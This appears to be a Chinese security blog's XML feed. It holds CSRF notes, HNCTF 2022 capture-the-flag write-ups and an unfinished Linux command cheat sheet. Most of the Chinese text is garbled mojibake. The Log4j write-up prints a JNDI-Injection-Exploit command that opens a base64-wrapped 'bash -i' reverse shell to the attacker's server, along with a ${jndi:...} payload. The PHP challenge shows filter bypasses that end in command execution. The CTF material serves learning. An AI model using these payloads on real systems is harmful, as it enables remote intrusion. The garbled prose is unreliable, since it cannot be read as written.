é“¾æ¥ï¼ŒPOSTå‹å†™ä¸€ä¸ªæäº¤è¡¨å•ï¼Œæµ‹è¯•æœ‰è·¨åŸŸæƒ…å†µä¸‹æäº¤çš„æ•°æ®åŒ…æ˜¯å¦ç”Ÿæ•ˆã€‚</p><ul><li>æ•°æ®åŒ…æ— tokenæœ‰refereréªŒè¯</li></ul><p>åªæœ‰refereréªŒè¯æ—¶ï¼Œå¯å°è¯•ç©ºrefererï¼Œæˆ–è€…å°è¯•åŸŸåä¼ªé€ ã€‚</p><ul><li>burpè‡ªå¸¦çš„csrfæ£€æµ‹åŠŸèƒ½</li></ul><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><blockquote><p>å…³é”®ç‚¹åœ¨äº</p><p>æ”»å‡»è€…å¯ä»¥é¢„å…ˆä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ï¼Œæ‰€ä»¥åªéœ€è¦ä½¿å¾—è¯·æ±‚å‚æ•°éš¾ä»¥ä¼ªé€ ã€‚</p></blockquote><ul><li><p>å½“ç”¨æˆ·å‘é€é‡è¦çš„è¯·æ±‚æ—¶éœ€è¦è¾“å…¥åŸå§‹å¯†ç ï¼Œæ‰‹æœºéªŒè¯ç ç­‰</p></li><li><p>è®¾ç½®Token</p></li><li><p>æ£€éªŒ referer æ¥æº</p><p>ç–‘é—®ï¼šrefererä¸æ˜¯å¯ä»¥è¿›è¡Œä¼ªé€ å—ï¼Ÿ</p><p>ç­”ï¼šæ”»å‡»è€…ç¡®å®å¯ä»¥åœ¨å‘é€è¯·æ±‚æ—¶è¿›è¡Œä¼ªé€ ï¼Œä½†æ˜¯csrfæ˜¯ç”¨æˆ·å‘èµ·è¯·æ±‚ï¼Œç”¨æˆ·ä¸ä¼šå»ä¼ªé€ ï¼›</p><p>ä¸è¿‡å½“ç½‘ç«™æœ¬èº«å¯ä»¥æ¤å…¥csrfçš„payloadæ—¶ï¼Œæ£€éªŒreferæ¥æºçš„é˜²å¾¡æ‰‹æ®µå°±å¤±æ•ˆäº†ã€‚</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022</title>
      <link href="/2023/05/31/HNCTF/"/>
      <url>/2023/05/31/HNCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="HNCTF-2022-WEEK3-Fun-php"><a href="#HNCTF-2022-WEEK3-Fun-php" class="headerlink" title="[HNCTF 2022 WEEK3]Fun_php"></a>[HNCTF 2022 WEEK3]Fun_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$getUserID</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]; </span><br><span class="line"><span class="variable">$getpass</span> = (<span class="keyword">int</span>)@<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmySaid</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;mySaid&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmyHeart</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;myHeart&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$verify</span> =@<span class="variable">$_POST</span>[<span class="string">&#x27;verify&#x27;</span>];</span><br><span class="line"><span class="variable">$want</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;want&#x27;</span>];</span><br><span class="line"><span class="variable">$final</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;final&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$getUserID</span>))</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$user</span> + <span class="variable">$getUserID</span>; <span class="comment">//u5er_D0_n0t_b3g1n_with_4_numb3r</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span> == <span class="number">114514</span> &amp;&amp; <span class="variable">$getpass</span> == <span class="variable">$pass</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$getmySaid</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$getmyHeart</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$getmySaid</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$getmyHeart</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cheater!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$week_1</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>å­—ç¬¦ä¸²ä¸æ•°å­—å¼±æ¯”è¾ƒ</p><blockquote><p>u5er_D0_n0t_b3g1n_with_4_numb3r</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;sdasd114514&#x27;</span> ==  <span class="number">114514</span></span><br><span class="line">    </span><br><span class="line">get --&gt; user=<span class="number">114514</span></span><br></pre></td></tr></table></figure></li><li><p>çŒœæµ‹$passä¸ºå­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;dbasdha&#x27;</span> == <span class="number">0</span> <span class="comment">//True</span></span><br><span class="line"></span><br><span class="line">get --&gt; pass=<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>å­—ç¬¦ä¸²ä¸æ•°å­—MD5ç›¸ç­‰</p><p>ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡  <strong>0eå¼€å¤´çš„æ•°å­—å­—ç¬¦ä¸²</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s214587387a</span><br><span class="line">   </span><br><span class="line"><span class="number">1586264293</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]===<span class="string">&quot;Probius&quot;</span>) <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">intval</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;Probius&quot;</span>,<span class="variable">$data</span>)===<span class="number">0</span>)</span><br><span class="line">        <span class="variable">$week_2</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>array_searché»˜è®¤å¼±æ¯”è¾ƒæŸ¥æ‰¾,è¿”å›æŸ¥æ‰¾æˆåŠŸå…ƒç´ çš„ä¸‹æ ‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$week_1</span> &amp;&amp; <span class="variable">$week_2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$data</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$verify</span>))</span><br><span class="line">        <span class="comment">// â€®â¦HNCTFâ©â¦Welcome to</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;hn&quot;</span> == <span class="variable">$_GET</span>[<span class="string">&#x27;hn&#x27;</span>] &amp;â€®â¦+!!â©â¦&amp; <span class="string">&quot;â€®â¦ Flag!â©â¦ctf&quot;</span> == <span class="variable">$_GET</span>[â€®â¦LAGâ©â¦ctf]) &#123; <span class="comment">//HN! flag!! F</span></span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">       </span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Fine!you win&quot;</span>;</span><br><span class="line">                    <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./<span class="subst">$want</span>&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5å¼±æ¯”è¾ƒï¼Œæ•°ç»„ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span>&amp;verify[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221101183032110-1686150252660.png" alt="image-20221101183032110"></p><p>é›¶å®½åº¦éšå†™ï¼Œï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get --&gt; </span><br><span class="line">    </span><br><span class="line">hn=hn&amp;%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6LAG%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf=%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6%<span class="number">20</span>Flag!%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br></pre></td></tr></table></figure><p>é€šé…ç¬¦ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; want=f*</span><br></pre></td></tr></table></figure><h3 id="HNCTF-2022-WEEK3-logjjjjlogjjjj"><a href="#HNCTF-2022-WEEK3-logjjjjlogjjjj" class="headerlink" title="[HNCTF 2022 WEEK3]logjjjjlogjjjj"></a>[HNCTF 2022 WEEK3]logjjjjlogjjjj</h3><p>å¤ç°ï¼š<a href="https://blog.csdn.net/weixin_47179815/article/details/125654828">https://blog.csdn.net/weixin_47179815/article/details/125654828</a></p><p>æœ¬åœ°ç¯å¢ƒï¼šJDKç‰ˆæœ¬1.8</p><p>æ”»å‡»æµç¨‹</p><ul><li><p>æœåŠ¡å™¨è¿è¡Œæ”»å‡»è„šæœ¬ç”Ÿæˆpayload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,base64(åå¼¹shell)&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A æœåŠ¡å™¨ip</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221101211620970-1686150252661.png" alt="image-20221101211620970"></p><ul><li><p>æœåŠ¡å™¨ç›‘å¬ç«¯å£</p></li><li><p>å‘é€payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:xxx:<span class="comment">//xxxx/xxx&#125;</span></span><br><span class="line">å°†ä¸Šé¢ç”Ÿæˆçš„payloadæ”¾å…¥ï¼ˆä¼˜å…ˆJDKï¼‰</span><br></pre></td></tr></table></figure><p>URLç¼–ç åå‘é€è¯·æ±‚</p><p><img src="/../images/image-20221101211959222-1686150252662.png" alt="image-20221101211959222"></p></li></ul><p>æˆåŠŸè¿æ¥</p><img src="E:\typora img\image-20221101211512855.png" alt="image-20221101211512855" style="zoom:50%;" /><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ç®€å•ç¼–ç "><a href="#ç®€å•ç¼–ç " class="headerlink" title="ç®€å•ç¼–ç "></a>ç®€å•ç¼–ç </h3><p>å›¾ç‰‡å°¾éƒ¨æœ‰ä¸€ä¸²urlç¼–ç åçš„å­—ç¬¦</p><p><img src="/../images/image-20221102000004428-1686150252663.png" alt="image-20221102000004428"></p><h3 id="HNCTF-2022-Week1-çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT"><a href="#HNCTF-2022-Week1-çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT" class="headerlink" title="[HNCTF 2022 Week1]çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT)"></a>[HNCTF 2022 Week1]çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT)</h3><p><img src="/../images/image-20221101232202282-1686150252663.png" alt="image-20221101232202282"></p><p>é¦–å…ˆä»Aå›¾ç‰‡ä¸­æå–å‡ºç»çº¬åº¦</p><p><img src="/../images/image-20221101232242899-1686150252663.png" alt="image-20221101232242899"></p><p>å› ä¸ºè¿™ä¸ªç»çº¬åº¦æ˜¯åº¦åˆ†ç§’çš„å½¢å¼ï¼Œéœ€è¦å…ˆè½¬æ¢ä¸ºåº¦æ•°å½¢å¼</p><p>æ ¼å¼è½¬æ¢ï¼š<a href="http://www.gzhatu.com/du2dfm.html">http://www.gzhatu.com/du2dfm.html</a></p><p>å®šä½ï¼š<a href="http://www.gzhatu.com/dingwei.html">http://www.gzhatu.com/dingwei.html</a></p><p><img src="/../images/image-20221101232434815-1686150252663.png" alt="image-20221101232434815"></p><p>Aå›¾ç‰‡ä¸­è¿˜æœ‰ä¸€ä¸ªæç¤º</p><p><img src="/../images/image-20221101232718045-1686150252663.png" alt="image-20221101232718045"></p><p>æ‰€ä»¥å¯ä»¥ç¡®å®šå®šä½æ˜¯æ­£ç¡®çš„ã€‚</p><p>ç„¶åæ ¹æ®ç¬¬äºŒå¼ å›¾ä¸­çš„æ²³æµå¯ä»¥çŸ¥é“æ˜¯å¾€å“ªæ¡è·¯èµ°çš„ã€‚</p><img src="E:\typora img\image-20221101232747393.png" alt="image-20221101232747393" style="zoom:67%;" /><p>ç”¨é«˜å¾·åœ°å›¾å®šä½å˜‰å…´ç”µä¿¡å¤§å¦ï¼Œå¾€é‚£æ¡è·¯æ‰¾ï¼Œæ‰¾åˆ°</p><img src="E:\typora img\image-20221101232627057.png" alt="image-20221101232627057" style="zoom:67%;" /><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(md5(<span class="string">&#x27;å˜‰å…´å¸‚å—æ¹–åŒºç¦¾å…´åŒ—è·¯506å·äºšèŠ¬æ±€ç²¾å“é…’åº—&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest())<span class="comment">#utf-8ç¼–ç </span></span><br></pre></td></tr></table></figure><p>SSCTF{f833a4d17d35ca5da40f087950293d04}</p><p>ä¹Ÿå¯ä»¥ç”¨exifå·¥å…·æŸ¥çœ‹</p><img src="E:\typora img\image-20221101234725942.png" alt="image-20221101234725942" style="zoom: 50%;" /><h3 id="HNCTF-2022-Week1-ä¸‰ç”Ÿä¸‰ä¸–"><a href="#HNCTF-2022-Week1-ä¸‰ç”Ÿä¸‰ä¸–" class="headerlink" title="[HNCTF 2022 Week1]ä¸‰ç”Ÿä¸‰ä¸–"></a>[HNCTF 2022 Week1]ä¸‰ç”Ÿä¸‰ä¸–</h3><p>å¼±å¯†ç çˆ†ç ´ï¼Œå›¾ç‰‡base64éšå†™å¾—åˆ°äºŒç»´ç ï¼Œæ‰«æåç”¨æ …æ å¯†ç è§£å¯†ï¼Œæ¯ç»„å­—æ•°ä¸º3.</p><h3 id="HNCTF-2022-Week1-silly-zip"><a href="#HNCTF-2022-Week1-silly-zip" class="headerlink" title="[HNCTF 2022 Week1]silly_zip"></a>[HNCTF 2022 Week1]silly_zip</h3><p>ä¼ªåŠ å¯†+IHDRä¿®æ”¹</p><h3 id="HNCTF-2022-Week1-piz-galf"><a href="#HNCTF-2022-Week1-piz-galf" class="headerlink" title="[HNCTF 2022 Week1]piz.galf"></a>[HNCTF 2022 Week1]piz.galf</h3><p>ä¸¤æ¬¡é€†åº</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\pmb.galf&quot;</span> , <span class="string">&#x27;rb&#x27;</span> ).read()</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\flag.bmp&quot;</span> , <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f2.write(f[ ::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå¸¸ç”¨å‘½ä»¤</title>
      <link href="/2023/05/31/Linux%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/05/31/Linux%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>Linuxä¸€åˆ‡çš†æ–‡ä»¶</p><p>æ²¡æœ‰ä¿¡æ¯å°±æ˜¯å¥½æ¶ˆæ¯ï¼Œè¯´æ˜å‘½ä»¤æˆåŠŸäº†ã€‚</p><h2 id="æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯"><a href="#æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯"></a>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><h2 id="åå°è¿è¡Œç¨‹åº"><a href="#åå°è¿è¡Œç¨‹åº" class="headerlink" title="åå°è¿è¡Œç¨‹åº"></a>åå°è¿è¡Œç¨‹åº</h2><ul><li>åå°è¿è¡Œ</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd &amp;</span><br><span class="line">nohup cmd</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹åå°ç¨‹åº</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jobs</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h2><h3 id="åˆ›å»ºæ–‡ä»¶"><a href="#åˆ›å»ºæ–‡ä»¶" class="headerlink" title="åˆ›å»ºæ–‡ä»¶"></a>åˆ›å»ºæ–‡ä»¶</h3><ul><li><p><code>vi /vim filename</code>ï¼šæ–‡æœ¬ç¼–è¾‘å™¨</p></li><li><p><code>touch filename</code>ï¼šåˆ›å»ºç©ºæ–‡ä»¶</p></li><li><p>é‡å®šå‘ç¬¦åˆ›å»º</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;string&quot; &gt; filename</span><br><span class="line">cat &gt; filenameï¼šè¾“å…¥æ–‡ä»¶å†…å®¹ï¼Œctrl+dä¿å­˜å¹¶é€€å‡º</span><br></pre></td></tr></table></figure></li></ul><h3 id="å¤åˆ¶æ–‡ä»¶-x2F-ç›®å½•"><a href="#å¤åˆ¶æ–‡ä»¶-x2F-ç›®å½•" class="headerlink" title="å¤åˆ¶æ–‡ä»¶&#x2F;ç›®å½•"></a>å¤åˆ¶æ–‡ä»¶&#x2F;ç›®å½•</h3><ul><li><p><code>cp file_path xx</code></p><p>å½“xxä¸ºæ–‡ä»¶æ—¶ï¼Œå³åˆ›å»ºfileçš„å‰¯æœ¬xx</p><p>å½“xxä¸ºç›®å½•æ—¶ï¼Œå³å°†fileå¤åˆ¶åˆ°xxç›®å½•ä¸‹</p><p>å¯é€‰å‚æ•°ï¼š-R  å¤åˆ¶æ–‡ä»¶å¤¹</p></li></ul><h3 id="æ–‡ä»¶é“¾æ¥"><a href="#æ–‡ä»¶é“¾æ¥" class="headerlink" title="æ–‡ä»¶é“¾æ¥"></a>æ–‡ä»¶é“¾æ¥</h3><ul><li><p>è½¯é“¾æ¥&#x2F;ç¬¦å·é“¾æ¥</p><p><code>ln -s æºæ–‡ä»¶å å¿«æ·æ–¹å¼å</code>ï¼ˆè½¯è¿æ¥ï¼Œåªæ˜¯åˆ›å»ºäº†ä¸€ä¸ªå¿«æ·æ–¹å¼ï¼‰</p></li><li><p>ç¡¬é“¾æ¥</p><p><code>ln  æºæ–‡ä»¶å æ–‡ä»¶å</code>ï¼ˆç¡¬é“¾æ¥ï¼Œä¸¤ä¸ªæ–‡ä»¶æ˜¯åŒæ­¥çš„ï¼Œå°±æ˜¯å¯¹ä»»æ„ä¸€ä¸ªæ“ä½œï¼Œéƒ½ä¼šå½±å“åˆ°ä¸¤ä¸ªï¼‰  </p></li><li><p>äºŒè€…åŒºåˆ«</p><p>åˆ é™¤äº†æºæ–‡ä»¶ï¼Œè½¯è¿æ¥å°±å¤±æ•ˆäº†ï¼Œè€Œç¡¬é“¾æ¥ç›¸å½“äºå‰¯æœ¬ï¼Œä¸å—å½±å“ã€‚</p></li></ul><h3 id="é‡å‘½åæ–‡ä»¶-x2F-ç›®å½•"><a href="#é‡å‘½åæ–‡ä»¶-x2F-ç›®å½•" class="headerlink" title="é‡å‘½åæ–‡ä»¶&#x2F;ç›®å½•"></a>é‡å‘½åæ–‡ä»¶&#x2F;ç›®å½•</h3><blockquote><p>åœ¨Linuxä¸­ï¼Œé‡å‘½åæ–‡ä»¶ç§°ä¸ºç§»åŠ¨ï¼ˆmovingï¼‰</p></blockquote><ul><li><code>mv name1  name2</code>ï¼šæ›´æ”¹æ–‡ä»¶å&#x2F;ç›®å½•å</li><li><code>mv name dir_path</code>ï¼šç§»åŠ¨æ–‡ä»¶&#x2F;ç›®å½•</li><li><code>mv file_path   dir_path+file_name2</code>ï¼šç§»åŠ¨æ–‡ä»¶å¹¶é‡å‘½å</li></ul><h3 id="åˆ é™¤æ–‡ä»¶"><a href="#åˆ é™¤æ–‡ä»¶" class="headerlink" title="åˆ é™¤æ–‡ä»¶"></a>åˆ é™¤æ–‡ä»¶</h3><blockquote><p>åœ¨Linuxä¸­ï¼Œåˆ é™¤ï¼ˆdeletingï¼‰å«ä½œç§»é™¤ï¼ˆremovingï¼‰ã€‚</p></blockquote><ul><li><code>rm  filename</code><ul><li>-iï¼šåˆ é™¤å‰è¯¢é—®</li><li>-fï¼šå¼ºåˆ¶åˆ é™¤</li></ul></li></ul><h3 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h3><table><thead><tr><th align="center">å‘½ä»¤</th><th align="center">ä½œç”¨</th><th align="center">å¯é€‰å‚æ•°</th></tr></thead><tbody><tr><td align="center">cat&#x2F;tac</td><td align="center">ä»å¤´åˆ°å°¾æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼ˆtacç›¸åï¼‰</td><td align="center">-nï¼šæ˜¾ç¤ºè¡Œå·</td></tr><tr><td align="center">head&#x2F;tail</td><td align="center">è¯»å–å‰&#x2F;ålinesè¡Œ</td><td align="center">â€“lines&#x3D;ï¼Ÿ</td></tr><tr><td align="center">nl</td><td align="center">æ˜¾ç¤ºè¡Œå·å’Œå†…å®¹</td><td align="center"></td></tr><tr><td align="center">sort</td><td align="center">æ’åºæ–‡ä»¶å†…å®¹å¹¶æ˜¾ç¤º</td><td align="center"></td></tr><tr><td align="center">more</td><td align="center">åˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td><td align="center"></td></tr><tr><td align="center">uniq</td><td align="center">å»é‡åï¼Œæ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td><td align="center"></td></tr><tr><td align="center">less</td><td align="center">ä¸€æ¬¡æ˜¾ç¤ºä¸€å±çš„æ–‡ä»¶æ–‡æœ¬</td><td align="center"></td></tr><tr><td align="center">paste</td><td align="center">å¯ä»¥å°†ä¸¤ä¸ªæ–‡æœ¬æŒ‰åˆ—æ‹¼æ¥åˆ°ä¸€èµ·æ˜¾ç¤º</td><td align="center"></td></tr><tr><td align="center">strings</td><td align="center">è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆcatä¸èƒ½è¯»å–äºŒè¿›åˆ¶ï¼‰</td><td align="center"></td></tr></tbody></table><h3 id="æœç´¢æ–‡ä»¶å†…å®¹"><a href="#æœç´¢æ–‡ä»¶å†…å®¹" class="headerlink" title="æœç´¢æ–‡ä»¶å†…å®¹"></a>æœç´¢æ–‡ä»¶å†…å®¹</h3><p><code>grep string filename</code> ï¼šåœ¨fileä¸­æŸ¥æ‰¾åŒ¹é…stringçš„å†…å®¹</p><p>å‚æ•°ï¼š</p><table><thead><tr><th align="center"></th><th align="center">åŠŸèƒ½</th><th align="center">ä¾‹å­</th></tr></thead><tbody><tr><td align="center">-v</td><td align="center">åå‘æœç´¢</td><td align="center">grep -v t file1</td></tr><tr><td align="center">-n</td><td align="center">æ˜¾ç¤ºè¡Œå·</td><td align="center">grep -n t file1</td></tr><tr><td align="center">-e</td><td align="center">å¤šä¸ªåŒ¹é…æ¨¡å¼</td><td align="center">grep -e t -e f file1ï¼šåŒ¹é…tå’Œfå­—ç¬¦</td></tr><tr><td align="center">æ­£åˆ™</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="æŸ¥çœ‹æ–‡ä»¶ç±»å‹-x2F-çŠ¶æ€"><a href="#æŸ¥çœ‹æ–‡ä»¶ç±»å‹-x2F-çŠ¶æ€" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶ç±»å‹&#x2F;çŠ¶æ€"></a>æŸ¥çœ‹æ–‡ä»¶ç±»å‹&#x2F;çŠ¶æ€</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file filename</span><br><span class="line">stat filename</span><br></pre></td></tr></table></figure><h3 id="è§£å‹ç¼©æ–‡ä»¶"><a href="#è§£å‹ç¼©æ–‡ä»¶" class="headerlink" title="è§£å‹ç¼©æ–‡ä»¶"></a>è§£å‹ç¼©æ–‡ä»¶</h3><p>èµ‹äºˆæ–‡ä»¶æƒé™</p><p><code>chmod +rw filename</code></p><ul><li><p>tar</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">è§£åŒ…ï¼štar xvf FileName.tar</span><br><span class="line">æ‰“åŒ…ï¼štar cvf FileName.tar DirName</span><br><span class="line">ï¼ˆæ³¨ï¼štaræ˜¯æ‰“åŒ…ï¼Œä¸æ˜¯å‹ç¼©ï¼ï¼‰</span><br></pre></td></tr></table></figure></li></ul><h3 id="æ–‡ä»¶æƒé™"><a href="#æ–‡ä»¶æƒé™" class="headerlink" title="æ–‡ä»¶æƒé™"></a>æ–‡ä»¶æƒé™</h3><p>ç†è§£æƒé™</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -l</span><br><span class="line">total 16</span><br><span class="line">-rwxrwxr-x 1 rich rich 4882 2010-09-18 13:58 myprog</span><br><span class="line">....</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230225224057939.png" alt="image-20230225224057939"></p><p>-rwxrwxr-xè§£è¯»ä¸º-ï¼Œrwxï¼Œrwxï¼Œr-x</p><ul><li><p>ç¬¬ä¸€ä¸ªå­—ç¬¦</p><table><thead><tr><th align="center">å­—ç¬¦</th><th align="center">å«ä¹‰</th></tr></thead><tbody><tr><td align="center">-</td><td align="center">ä»£è¡¨æ–‡ä»¶</td></tr><tr><td align="center">d</td><td align="center">ä»£è¡¨ç›®å½•</td></tr><tr><td align="center">l</td><td align="center">ä»£è¡¨é“¾æ¥</td></tr><tr><td align="center">c</td><td align="center">ä»£è¡¨å­—ç¬¦å‹è®¾å¤‡</td></tr><tr><td align="center">b</td><td align="center">ä»£è¡¨å—è®¾å¤‡</td></tr><tr><td align="center">n</td><td align="center">nä»£è¡¨ç½‘ç»œè®¾å¤‡</td></tr></tbody></table></li><li><p>åé¢9ä¸ªå­—ç¬¦ï¼Œæ¯ä¸‰ä¸ªä¸ºä¸€ç»„              </p><table><thead><tr><th align="center">å­—ç¬¦</th><th align="center">å«ä¹‰</th><th align="center">æ¯ä¸€ç»„å¯¹åº”çš„å®‰å…¨çº§åˆ«</th></tr></thead><tbody><tr><td align="center">r</td><td 